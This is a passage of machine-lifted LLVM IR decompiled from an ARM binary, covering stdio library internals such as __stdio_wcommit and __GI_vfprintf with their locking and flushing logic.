  %v1_23574 = inttoptr i32 %v0_23574 to i32*
  %v2_23574 = load i32, i32* %v1_23574, align 4
  store i32 %v2_23574, i32* %r0.global-to-local, align 4
  %v3_23574 = add i32 %v0_23574, 4
  %v4_23574 = inttoptr i32 %v3_23574 to i32*
  %v5_23574 = load i32, i32* %v4_23574, align 4
  store i32 %v5_23574, i32* %r1.global-to-local, align 4
  %v6_23574 = add i32 %v0_23574, 8
  %v7_23574 = inttoptr i32 %v6_23574 to i32*
  %v8_23574 = load i32, i32* %v7_23574, align 4
  %v2_23578 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_23578, i32* %r3.global-to-local, align 4
  store i32 %v2_23574, i32* %stack_var_-56, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_23584 = load i32, i32* %r7.global-to-local, align 4
  %v2_23584 = add i32 %v0_23584, 88
  %v3_23584 = inttoptr i32 %v2_23584 to i32*
  %v4_23584 = load i32, i32* %v3_23584, align 4
  store i32 %v4_23584, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_2358c = inttoptr i32 %v4_23584 to i32*
  %v2_2358c = load i32, i32* %v1_2358c, align 4
  store i32 %v2_2358c, i32* %r5.global-to-local, align 4
  %v2_23590 = add i32 %v0_23584, 176
  %v3_23590 = inttoptr i32 %v2_23590 to i32*
  %v4_23590 = load i32, i32* %v3_23590, align 4
  store i32 %v2_23574, i32* %r0.global-to-local, align 4
  store i32 %v5_23574, i32* %r1.global-to-local, align 4
  store i32 %v8_23574, i32* %r2.global-to-local, align 4
  store i32 -37600, i32* %r3.global-to-local, align 4
  %v2_235a0 = add i32 %v0_23584, -37600
  store i32 %v2_235a0, i32* %sl.global-to-local, align 4
  %v1_235a4 = inttoptr i32 %v4_23590 to i32*
  store i32 %v2_23574, i32* %v1_235a4, align 4
  %v3_235a4 = add i32 %v4_23590, 4
  %v4_235a4 = inttoptr i32 %v3_235a4 to i32*
  %v5_235a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_235a4, i32* %v4_235a4, align 4
  %v6_235a4 = add i32 %v4_23590, 8
  %v7_235a4 = inttoptr i32 %v6_235a4 to i32*
  %v8_235a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_235a4, i32* %v7_235a4, align 4
  %v0_23634.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2363416 = icmp eq i32 %v0_23634.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_2363c18 = add i32 %v0_23634.pr, 56
  store i32 %v1_2363c18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_2363416, label %dec_label_pc_23648, label %dec_label_pc_235ac

dec_label_pc_235ac:                               ; preds = %entry, %.thread10
  %v0_235ac = phi i32 [ %v3_23630, %.thread10 ], [ %v0_23634.pr, %entry ]
  %v1_235ac = add i32 %v0_235ac, 64
  %v2_235ac = inttoptr i32 %v1_235ac to i32*
  %v3_235ac = load i32, i32* %v2_235ac, align 4
  store i32 %v3_235ac, i32* %r3.global-to-local, align 4
  %v0_235b0 = call i32 @__aeabi_read_tp()
  store i32 %v0_235b0, i32* %r0.global-to-local, align 4
  %v1_235b4 = add i32 %v0_235b0, -1168
  store i32 %v1_235b4, i32* %r6.global-to-local, align 4
  %v3_235b8 = icmp uge i32 %v3_235ac, %v1_235b4
  store i1 %v3_235b8, i1* %cpsr_c.global-to-local, align 1
  %v9_235b8 = icmp eq i32 %v3_235ac, %v1_235b4
  br i1 %v9_235b8, label %.thread1, label %dec_label_pc_235cc

.thread1:                                         ; preds = %dec_label_pc_235ac
  %v1_235bc = load i32, i32* %r5.global-to-local, align 4
  %v2_235bc = add i32 %v1_235bc, 60
  %v3_235bc = inttoptr i32 %v2_235bc to i32*
  %v4_235bc = load i32, i32* %v3_235bc, align 4
  %v2_235c0 = add i32 %v4_235bc, 1
  store i32 %v2_235c0, i32* %r3.global-to-local, align 4
  store i32 %v2_235c0, i32* %v3_235bc, align 4
  br label %.thread10

dec_label_pc_235cc:                               ; preds = %dec_label_pc_235ac, %dec_label_pc_235d8
  %v0_235cc = load i32, i32* %r2.global-to-local, align 4
  %v1_235cc = inttoptr i32 %v0_235cc to i32*
  %v2_235cc = load i32, i32* %v1_235cc, align 4
  store i32 %v2_235cc, i32* %r3.global-to-local, align 4
  %v1_235d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_235d0 = icmp uge i32 %v2_235cc, %v1_235d0
  store i1 %v3_235d0, i1* %cpsr_c.global-to-local, align 1
  %v9_235d0 = icmp eq i32 %v2_235cc, %v1_235d0
  br i1 %v9_235d0, label %dec_label_pc_235d8, label %dec_label_pc_235f0

dec_label_pc_235d8:                               ; preds = %dec_label_pc_235cc
  store i32 %v2_235cc, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_235e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_235e8, label %dec_label_pc_235ec, label %dec_label_pc_235cc

dec_label_pc_235ec:                               ; preds = %dec_label_pc_235d8
  %v0_235ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_235ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_235f0

dec_label_pc_235f0:                               ; preds = %dec_label_pc_235cc, %dec_label_pc_235ec
  %v0_235f0 = phi i32 [ %v0_235ec, %dec_label_pc_235ec ], [ %v2_235cc, %dec_label_pc_235cc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_235f0 = icmp eq i32 %v0_235f0, 0
  %v2_235fc.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_235f0, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_235f0
  %v1_235fc = load i32, i32* %r6.global-to-local, align 4
  %v3_235fc = add i32 %v2_235fc.pre, 64
  %v4_235fc = inttoptr i32 %v3_235fc to i32*
  store i32 %v1_235fc, i32* %v4_235fc, align 4
  %v1_23600 = load i32, i32* %r1.global-to-local, align 4
  %v2_23600 = load i32, i32* %r5.global-to-local, align 4
  %v3_23600 = add i32 %v2_23600, 60
  %v4_23600 = inttoptr i32 %v3_23600 to i32*
  store i32 %v1_23600, i32* %v4_23600, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_235f0
  %v2_235f4 = add i32 %v2_235fc.pre, 8
  %v3_235f4 = inttoptr i32 %v2_235f4 to i32*
  %v4_235f4 = load i32, i32* %v3_235f4, align 4
  store i32 %v4_235f4, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_23604 = add i32 %v2_235fc.pre, 20
  %v4_23604 = inttoptr i32 %v3_23604 to i32*
  store i32 %v4_235f4, i32* %v4_23604, align 4
  %v1_23608 = load i32, i32* %r2.global-to-local, align 4
  %v2_23608 = trunc i32 %v1_23608 to i16
  %v3_23608 = load i32, i32* %r5.global-to-local, align 4
  %v4_23608 = inttoptr i32 %v3_23608 to i16*
  store i16 %v2_23608, i16* %v4_23608, align 2
  %v1_2360c = load i32, i32* %r3.global-to-local, align 4
  %v2_2360c = load i32, i32* %r5.global-to-local, align 4
  %v3_2360c = add i32 %v2_2360c, 24
  %v4_2360c = inttoptr i32 %v3_2360c to i32*
  store i32 %v1_2360c, i32* %v4_2360c, align 4
  %v1_23610 = load i32, i32* %r3.global-to-local, align 4
  %v2_23610 = load i32, i32* %r5.global-to-local, align 4
  %v3_23610 = add i32 %v2_23610, 28
  %v4_23610 = inttoptr i32 %v3_23610 to i32*
  store i32 %v1_23610, i32* %v4_23610, align 4
  %v1_23614 = load i32, i32* %r3.global-to-local, align 4
  %v2_23614 = load i32, i32* %r5.global-to-local, align 4
  %v3_23614 = add i32 %v2_23614, 16
  %v4_23614 = inttoptr i32 %v3_23614 to i32*
  store i32 %v1_23614, i32* %v4_23614, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_23618 = load i32, i32* %sl.global-to-local, align 4
  %v1_23618 = inttoptr i32 %v0_23618 to i32*
  %v2_23618 = load i32, i32* %v1_23618, align 4
  store i32 %v2_23618, i32* %r0.global-to-local, align 4
  %v3_23618 = add i32 %v0_23618, 4
  %v4_23618 = inttoptr i32 %v3_23618 to i32*
  %v5_23618 = load i32, i32* %v4_23618, align 4
  store i32 %v5_23618, i32* %r1.global-to-local, align 4
  %v6_23618 = add i32 %v0_23618, 8
  %v7_23618 = inttoptr i32 %v6_23618 to i32*
  %v8_23618 = load i32, i32* %v7_23618, align 4
  store i32 %v8_23618, i32* %r2.global-to-local, align 4
  %v1_23620 = load i32, i32* %r5.global-to-local, align 4
  %v2_23620 = add i32 %v1_23620, 52
  %v3_23620 = inttoptr i32 %v2_23620 to i32*
  store i32 1, i32* %v3_23620, align 4
  %v0_23624 = load i32, i32* %r5.global-to-local, align 4
  %v1_23624 = add i32 %v0_23624, 56
  store i32 %v1_23624, i32* %r3.global-to-local, align 4
  %v2_23628 = load i32, i32* %r0.global-to-local, align 4
  %v1_2362c = inttoptr i32 %v1_23624 to i32*
  store i32 %v2_23628, i32* %v1_2362c, align 4
  %v3_2362c = add i32 %v0_23624, 60
  %v4_2362c = inttoptr i32 %v3_2362c to i32*
  %v5_2362c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2362c, i32* %v4_2362c, align 4
  %v6_2362c = add i32 %v0_23624, 64
  %v7_2362c = inttoptr i32 %v6_2362c to i32*
  %v8_2362c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2362c, i32* %v7_2362c, align 4
  %v0_23630 = load i32, i32* %r5.global-to-local, align 4
  %v1_23630 = add i32 %v0_23630, 32
  %v2_23630 = inttoptr i32 %v1_23630 to i32*
  %v3_23630 = load i32, i32* %v2_23630, align 4
  store i32 %v3_23630, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_23634 = icmp eq i32 %v3_23630, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_2363c = add i32 %v3_23630, 56
  store i32 %v1_2363c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_23634, label %dec_label_pc_23648, label %dec_label_pc_235ac

dec_label_pc_23648:                               ; preds = %.thread10, %entry
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_2364c = load i32, i32* %r7.global-to-local, align 4
  %v2_2364c = add i32 %v0_2364c, 88
  %v3_2364c = inttoptr i32 %v2_2364c to i32*
  %v4_2364c = load i32, i32* %v3_2364c, align 4
  store i32 %v4_2364c, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_2364c to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2366c14 = icmp eq i32 %storemerge12, 0
  br i1 %v2_2366c14, label %dec_label_pc_23674, label %dec_label_pc_23658

dec_label_pc_23658:                               ; preds = %dec_label_pc_23648, %dec_label_pc_2366c
  %v1_23660 = phi i32 [ %storemerge, %dec_label_pc_2366c ], [ %storemerge12, %dec_label_pc_23648 ]
  %v1_23658 = inttoptr i32 %v1_23660 to i16*
  %v2_23658 = load i16, i16* %v1_23658, align 2
  %v3_23658 = zext i16 %v2_23658 to i32
  store i32 %v3_23658, i32* %r3.global-to-local, align 4
  %v1_2365c = and i32 %v3_23658, 64
  %v2_2365c = icmp eq i32 %v1_2365c, 0
  br i1 %v2_2365c, label %dec_label_pc_2366c, label %bb39

bb39:                                             ; preds = %dec_label_pc_23658
  store i32 %v1_23660, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2366c

dec_label_pc_2366c:                               ; preds = %dec_label_pc_23658, %bb39
  %v1_23664 = xor i1 %v2_2365c, true
  call void @__pseudo_cond_branch(i1 %v1_23664, i32 ptrtoint (i32* @global_var_2369c.3090 to i32))
  %v0_23668 = load i32, i32* %r4.global-to-local, align 4
  %v1_23668 = add i32 %v0_23668, 32
  %storemerge.in = inttoptr i32 %v1_23668 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2366c = icmp eq i32 %storemerge, 0
  br i1 %v2_2366c, label %dec_label_pc_23674, label %dec_label_pc_23658

dec_label_pc_23674:                               ; preds = %dec_label_pc_2366c, %dec_label_pc_23648
  %v2_23678 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_23678, i32* %r4.global-to-local, align 4
  %v1_2367c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2367c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_23630, { 1, 2, 3, 0 }
  uselistorder i32 %v1_235d0, { 1, 0 }
  uselistorder i32 %v4_23590, { 2, 1, 0 }
  uselistorder i32 %v4_23560, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_2366c, { 1, 0 }
  uselistorder label %dec_label_pc_23658, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_235f0, { 1, 0 }
  uselistorder label %dec_label_pc_235cc, { 1, 0 }
  uselistorder label %dec_label_pc_235ac, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2369c = load i32, i32* @r4, align 4
  store i32 %v3_2369c, i32* %stack_var_-8, align 4
  %v0_236a0 = load i32, i32* @r0, align 4
  %v1_236a0 = add i32 %v0_236a0, 8
  %v2_236a0 = inttoptr i32 %v1_236a0 to i32*
  %v3_236a0 = load i32, i32* %v2_236a0, align 4
  %v1_236a4 = add i32 %v0_236a0, 16
  %v2_236a4 = inttoptr i32 %v1_236a4 to i32*
  %v3_236a4 = load i32, i32* %v2_236a4, align 4
  %v9_236a8 = icmp eq i32 %v3_236a4, %v3_236a0
  store i32 %v0_236a0, i32* %r4.global-to-local, align 4
  br i1 %v9_236a8, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_236a0, i32* %v2_236a4, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_236b4 = xor i1 %v9_236a8, true
  call void @__pseudo_cond_branch(i1 %v1_236b4, i32 ptrtoint (i32* @global_var_2a3a0.3091 to i32))
  %v0_236b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_236b8 = add i32 %v0_236b8, 8
  %v2_236b8 = inttoptr i32 %v1_236b8 to i32*
  %v3_236b8 = load i32, i32* %v2_236b8, align 4
  store i32 %v3_236b8, i32* @r3, align 4
  %v1_236bc = add i32 %v0_236b8, 16
  %v2_236bc = inttoptr i32 %v1_236bc to i32*
  %v3_236bc = load i32, i32* %v2_236bc, align 4
  %v2_236c0 = sub i32 %v3_236bc, %v3_236b8
  %v2_236c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_236c4, i32* @r4, align 4
  ret i32 %v2_236c0

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_236cc = load i32, i32* @r4, align 4
  store i32 %v3_236cc, i32* %stack_var_-32, align 4
  %v6_236cc = load i32, i32* @r5, align 4
  %v9_236cc = load i32, i32* @r6, align 4
  %v0_236d0 = load i32, i32* @r0, align 4
  %v1_236d0 = add i32 %v0_236d0, 52
  %v2_236d0 = inttoptr i32 %v1_236d0 to i32*
  %v3_236d0 = load i32, i32* %v2_236d0, align 4
  store i32 %v3_236d0, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_236d4 = icmp eq i32 %v3_236d0, 0
  store i32 %v0_236d0, i32* @r7, align 4
  %v0_236dc = load i32, i32* @r1, align 4
  store i32 %v0_236dc, i32* @sl, align 4
  %v0_236e0 = load i32, i32* @r2, align 4
  store i32 %v0_236e0, i32* @sb, align 4
  br i1 %v2_236d4, label %dec_label_pc_236e8, label %dec_label_pc_2374c

dec_label_pc_236e8:                               ; preds = %entry
  %v0_236e8 = call i32 @__aeabi_read_tp()
  %v0_236ec = load i32, i32* @r7, align 4
  %v1_236ec = add i32 %v0_236ec, 64
  %v2_236ec = inttoptr i32 %v1_236ec to i32*
  %v3_236ec = load i32, i32* %v2_236ec, align 4
  store i32 %v3_236ec, i32* %r3.global-to-local, align 4
  %v1_236f0 = add i32 %v0_236e8, -1168
  store i32 %v1_236f0, i32* @r6, align 4
  %v3_236f4 = icmp uge i32 %v3_236ec, %v1_236f0
  store i1 %v3_236f4, i1* %cpsr_c.global-to-local, align 1
  %v9_236f4 = icmp eq i32 %v3_236ec, %v1_236f0
  br i1 %v9_236f4, label %dec_label_pc_23740, label %dec_label_pc_236fc

dec_label_pc_236fc:                               ; preds = %dec_label_pc_236e8
  %v1_236fc = add i32 %v0_236ec, 56
  store i32 %v1_236fc, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_236fc, i32* %r2.global-to-local, align 4
  %v0_23708 = load i32, i32* @r8, align 4
  store i32 %v0_23708, i32* @r4, align 4
  %v1_2370c36 = inttoptr i32 %v1_236fc to i32*
  %v2_2370c37 = load i32, i32* %v1_2370c36, align 4
  store i32 %v2_2370c37, i32* %r3.global-to-local, align 4
  %v3_2371039 = icmp uge i32 %v2_2370c37, %v0_23708
  store i1 %v3_2371039, i1* %cpsr_c.global-to-local, align 1
  %v9_2371045 = icmp eq i32 %v2_2370c37, %v0_23708
  br i1 %v9_2371045, label %dec_label_pc_23718, label %dec_label_pc_23730

dec_label_pc_23718:                               ; preds = %dec_label_pc_236fc, %dec_label_pc_23718.dec_label_pc_2370c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_23728 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_23728, label %dec_label_pc_2372c, label %dec_label_pc_23718.dec_label_pc_2370c_crit_edge

dec_label_pc_23718.dec_label_pc_2370c_crit_edge:  ; preds = %dec_label_pc_23718
  %v0_2370c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_23710.pre = load i32, i32* @r4, align 4
  %v1_2370c = inttoptr i32 %v0_2370c.pre to i32*
  %v2_2370c = load i32, i32* %v1_2370c, align 4
  store i32 %v2_2370c, i32* %r3.global-to-local, align 4
  %v3_23710 = icmp uge i32 %v2_2370c, %v1_23710.pre
  store i1 %v3_23710, i1* %cpsr_c.global-to-local, align 1
  %v9_23710 = icmp eq i32 %v2_2370c, %v1_23710.pre
  br i1 %v9_23710, label %dec_label_pc_23718, label %dec_label_pc_23730

dec_label_pc_2372c:                               ; preds = %dec_label_pc_23718
  %v0_2372c = load i32, i32* @r4, align 4
  store i32 %v0_2372c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_23730

dec_label_pc_23730:                               ; preds = %dec_label_pc_236fc, %dec_label_pc_23718.dec_label_pc_2370c_crit_edge, %dec_label_pc_2372c
  %v0_23730 = phi i32 [ %v0_2372c, %dec_label_pc_2372c ], [ %v2_2370c37, %dec_label_pc_236fc ], [ %v2_2370c, %dec_label_pc_23718.dec_label_pc_2370c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_23730 = icmp eq i32 %v0_23730, 0
  br i1 %v2_23730, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_23730
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_23730, %bb
  store i32 145212, i32* @lr, align 4
  %v1_23738 = xor i1 %v2_23730, true
  call void @__pseudo_cond_branch(i1 %v1_23738, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2373c = load i32, i32* @r6, align 4
  %v1_2373c = load i32, i32* @r7, align 4
  %v2_2373c = add i32 %v1_2373c, 64
  %v3_2373c = inttoptr i32 %v2_2373c to i32*
  store i32 %v0_2373c, i32* %v3_2373c, align 4
  %v0_23740.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_23740

dec_label_pc_23740:                               ; preds = %dec_label_pc_236e8, %bb19
  %v0_23740 = phi i32 [ %v0_236ec, %dec_label_pc_236e8 ], [ %v0_23740.pre, %bb19 ]
  %v1_23740 = add i32 %v0_23740, 60
  %v2_23740 = inttoptr i32 %v1_23740 to i32*
  %v3_23740 = load i32, i32* %v2_23740, align 4
  %v1_23744 = add i32 %v3_23740, 1
  store i32 %v1_23744, i32* %r3.global-to-local, align 4
  store i32 %v1_23744, i32* %v2_23740, align 4
  %v0_2374c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2374c

dec_label_pc_2374c:                               ; preds = %entry, %dec_label_pc_23740
  %v0_2375c = phi i32 [ %v0_236d0, %entry ], [ %v0_2374c.pre, %dec_label_pc_23740 ]
  %v1_2374c = inttoptr i32 %v0_2375c to i16*
  %v2_2374c = load i16, i16* %v1_2374c, align 2
  %v3_2374c = zext i16 %v2_2374c to i32
  %v1_23750 = and i32 %v3_2374c, 192
  store i32 %v1_23750, i32* %r3.global-to-local, align 4
  %v2_23754 = icmp eq i32 %v1_23750, 192
  store i1 %v2_23754, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_23754, label %dec_label_pc_23774, label %dec_label_pc_2375c

dec_label_pc_2375c:                               ; preds = %dec_label_pc_2374c
  store i32 128, i32* %r1.global-to-local, align 4
  %v3_23764 = call i32 @__stdio_trans2w_o(i16* %v1_2374c, i32 128)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_23768 = icmp eq i32 %v3_23764, 0
  br i1 %v2_23768, label %dec_label_pc_2375c.dec_label_pc_23774_crit_edge, label %dec_label_pc_23788

dec_label_pc_2375c.dec_label_pc_23774_crit_edge:  ; preds = %dec_label_pc_2375c
  %v0_2377c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_23774

dec_label_pc_23774:                               ; preds = %dec_label_pc_2375c.dec_label_pc_23774_crit_edge, %dec_label_pc_2374c
  %v0_2377c = phi i32 [ %v0_2377c.pre, %dec_label_pc_2375c.dec_label_pc_23774_crit_edge ], [ %v0_2375c, %dec_label_pc_2374c ]
  %v0_23774 = load i32, i32* @sl, align 4
  store i32 %v0_23774, i32* %r1.global-to-local, align 4
  %v0_23778 = load i32, i32* @sb, align 4
  store i32 %v0_23778, i32* @r2, align 4
  %v2_23780 = inttoptr i32 %v0_23774 to i8*
  %v3_23780 = call i32 @_vfprintf_internal(i32 %v0_2377c, i8* %v2_23780)
  br label %dec_label_pc_23788

dec_label_pc_23788:                               ; preds = %dec_label_pc_2375c, %dec_label_pc_23774
  %storemerge = phi i32 [ %v3_23780, %dec_label_pc_23774 ], [ -1, %dec_label_pc_2375c ]
  store i32 %storemerge, i32* %r6.global-to-local, align 4
  %v0_23788 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_23788 = icmp eq i32 %v0_23788, 0
  br i1 %v2_23788, label %dec_label_pc_23790, label %dec_label_pc_23804

dec_label_pc_23790:                               ; preds = %dec_label_pc_23788
  %v0_23790 = load i32, i32* @r7, align 4
  %v1_23790 = add i32 %v0_23790, 60
  %v2_23790 = inttoptr i32 %v1_23790 to i32*
  %v3_23790 = load i32, i32* %v2_23790, align 4
  %v1_23794 = add i32 %v3_23790, -1
  store i32 %v1_23794, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_23798 = icmp eq i32 %v1_23794, 0
  store i32 %v1_23794, i32* %v2_23790, align 4
  br i1 %v2_23798, label %dec_label_pc_237a4, label %dec_label_pc_23804

dec_label_pc_237a4:                               ; preds = %dec_label_pc_23790
  %v0_237a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_237a4 = load i32, i32* @r7, align 4
  %v2_237a4 = add i32 %v1_237a4, 64
  %v3_237a4 = inttoptr i32 %v2_237a4 to i32*
  store i32 %v0_237a4, i32* %v3_237a4, align 4
  %v0_237a8 = load i32, i32* @r7, align 4
  %v1_237a8 = add i32 %v0_237a8, 56
  store i32 %v1_237a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_237ac

dec_label_pc_237ac:                               ; preds = %dec_label_pc_237dc.dec_label_pc_237ac_crit_edge, %dec_label_pc_237a4
  %v0_237b4 = phi i32 [ %v0_237b4.pre, %dec_label_pc_237dc.dec_label_pc_237ac_crit_edge ], [ %v1_237a8, %dec_label_pc_237a4 ]
  %v0_237ac = phi i32 [ %v0_237ac.pre, %dec_label_pc_237dc.dec_label_pc_237ac_crit_edge ], [ %v0_237a8, %dec_label_pc_237a4 ]
  %v1_237ac = add i32 %v0_237ac, 56
  %v2_237ac = inttoptr i32 %v1_237ac to i32*
  %v3_237ac = load i32, i32* %v2_237ac, align 4
  store i32 %v3_237ac, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_237b4, i32* %r2.global-to-local, align 4
  %v1_237b824 = inttoptr i32 %v0_237b4 to i32*
  %v2_237b825 = load i32, i32* %v1_237b824, align 4
  store i32 %v2_237b825, i32* %r3.global-to-local, align 4
  %v3_237bc27 = icmp uge i32 %v2_237b825, %v3_237ac
  store i1 %v3_237bc27, i1* %cpsr_c.global-to-local, align 1
  %v9_237bc33 = icmp eq i32 %v2_237b825, %v3_237ac
  br i1 %v9_237bc33, label %dec_label_pc_237c4, label %dec_label_pc_237dc

dec_label_pc_237c4:                               ; preds = %dec_label_pc_237ac, %dec_label_pc_237c4.dec_label_pc_237b8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_237d4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_237d4, label %dec_label_pc_237d8, label %dec_label_pc_237c4.dec_label_pc_237b8_crit_edge

dec_label_pc_237c4.dec_label_pc_237b8_crit_edge:  ; preds = %dec_label_pc_237c4
  %v0_237b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_237bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_237b8 = inttoptr i32 %v0_237b8.pre to i32*
  %v2_237b8 = load i32, i32* %v1_237b8, align 4
  store i32 %v2_237b8, i32* %r3.global-to-local, align 4
  %v3_237bc = icmp uge i32 %v2_237b8, %v1_237bc.pre
  store i1 %v3_237bc, i1* %cpsr_c.global-to-local, align 1
  %v9_237bc = icmp eq i32 %v2_237b8, %v1_237bc.pre
  br i1 %v9_237bc, label %dec_label_pc_237c4, label %dec_label_pc_237dc

dec_label_pc_237d8:                               ; preds = %dec_label_pc_237c4
  %v0_237d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_237d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_237dc

dec_label_pc_237dc:                               ; preds = %dec_label_pc_237ac, %dec_label_pc_237c4.dec_label_pc_237b8_crit_edge, %dec_label_pc_237d8
  %v0_237e4 = phi i32 [ %v0_237d8, %dec_label_pc_237d8 ], [ %v2_237b825, %dec_label_pc_237ac ], [ %v2_237b8, %dec_label_pc_237c4.dec_label_pc_237b8_crit_edge ]
  %v1_237dc = phi i32 [ %v0_237d8, %dec_label_pc_237d8 ], [ %v3_237ac, %dec_label_pc_237ac ], [ %v1_237bc.pre, %dec_label_pc_237c4.dec_label_pc_237b8_crit_edge ]
  %v3_237dc = icmp uge i32 %v0_237e4, %v1_237dc
  store i1 %v3_237dc, i1* %cpsr_c.global-to-local, align 1
  %v9_237dc = icmp eq i32 %v0_237e4, %v1_237dc
  br i1 %v9_237dc, label %dec_label_pc_237e4, label %dec_label_pc_237dc.dec_label_pc_237ac_crit_edge

dec_label_pc_237dc.dec_label_pc_237ac_crit_edge:  ; preds = %dec_label_pc_237dc
  %v0_237ac.pre = load i32, i32* @r7, align 4
  %v0_237b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_237ac

dec_label_pc_237e4:                               ; preds = %dec_label_pc_237dc
  %v2_237e4 = icmp ne i32 %v1_237dc, 0
  store i1 %v2_237e4, i1* %cpsr_c.global-to-local, align 1
  %v7_237e8 = icmp slt i32 %v1_237dc, 2
  br i1 %v7_237e8, label %dec_label_pc_23804, label %dec_label_pc_237ec

dec_label_pc_237ec:                               ; preds = %dec_label_pc_237e4
  %v0_237f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_237f0 = add i32 %v0_237f0, 129
  store i32 %v1_237f0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_23804

